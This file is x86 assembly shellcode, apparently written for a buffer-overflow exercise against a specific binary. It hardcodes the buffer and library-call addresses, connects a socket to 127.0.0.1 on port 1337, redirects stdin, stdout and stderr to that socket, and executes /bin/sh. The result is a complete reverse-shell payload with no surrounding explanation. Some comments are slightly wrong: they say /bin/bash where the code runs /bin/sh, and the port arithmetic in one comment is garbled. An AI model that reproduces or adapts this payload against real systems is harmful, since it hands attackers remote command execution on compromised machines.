# 0xbfffdcac - buffer start
# 0xbfffe0ac - buffer end
# 0x8048730 - socket address
# 0x8048750 - connect address
# 0x8048710 - fork address
# 0x8048600 - dup2 address
# 0x80486d0 - execv address
# 0x8048650 - perror address
# 0x80486a0 - exit address


mov esp, 0xbfffdcac        # esp = pointer to Start of the buffer
sub esp, 4
mov ebp, esp
sub esp, 0x60              # move esp to get enough memory space


_create_socket:            # in C: socket(AF_INET, SOCK_STREAM, 0)
    push 0                 # store arg2 = Protocol
    push 1                 # store arg1 = SOCK_STREAM (byte stream)
    push 2                 # store arg0 = AF_INET
    mov eax, 0x08048730    # eax = _socket address 
    call eax               # eax = file descriptor (the reurn value from _socket)
    add esp, 12            # close stack
    mov [ebp-0x4], eax
       

_connect:                  # in C: connect(int fd, sockaddr* addr, int length)
    mov ecx, 0             # ecx = 0
    push ecx               # store 8 zeros to the stack
    push ecx
    mov ecx, 0x0100007f    # store 4 bytes[1,0,0,127] (for 127.0.0.1) 
    push ecx               # store ip address 127.0.0.1 
    mov bx, 0x3905         # store 2 bytes[57,1280] (1280+57= 1337 for Port 1337)
    push bx                # store port number 1337
    mov bx, 0x2            # bx = 2
    push bx                # push FAMILY = 2 
    mov ecx, esp           # ecx = stack pointer (pointer to the sockaddr*)
    mov ebx, 16            # ebx = 16 (struct length)
    push ebx               # store arg2 = length (= 16) 
    push ecx               # store arg1 = address struct pointer (sockaddr* addr)
    push eax               # store arg0 = socket file descriptor
    mov eax, 0x08048750    # go to _connect 
    call eax               
    add esp, 28            # close stack 
    mov [ebp-0x10], eax
 
    
_redirect:
    push 0                 # store arg1 = New fd - STDIN
    push [ebp-0x4]         # store arg0 = Old fd                                
    mov eax, 0x08048600    # go to _dup2
    call eax
    add esp, 8             # close stack
       
    push 1                 # store arg1 = New fd - STDOUT             
    push [ebp-0x4]         # store arg0 = Old fd
    mov eax, 0x08048600    # go to _dup2
    call eax 
    add esp, 8             # close stack
    
    push 2                 # store arg1 = New fd - STDERR
    push [ebp-0x4]         # store arg0 = Old fd     
    mov eax, 0x08048600    # go to _dup2
    call eax
    add esp, 8             # close stack


_shellcode:
    jmp _get_path

_execv:                    # in C: execv(const char* path, const char* argv[])
    pop ebx                # ebx = pointer to "/bin/bash"
    mov eax, 0             # eax = NULL
    mov [ebp-0x40], ebx    # argv[0] = "/bin/bash"
    mov [ebp-0x3c], eax    # argv[1] = NULL
    lea eax, [ebp-0x40]
    push eax               # path to arguemnts: pointer to ebx value
    push ebx               # path to execute ebx
    mov eax, 0x80486d0     # go to _execv
    call eax  
    add esp, 0x8           # close stack

_get_path:
    call _execv
    .STRING "/bin/sh"
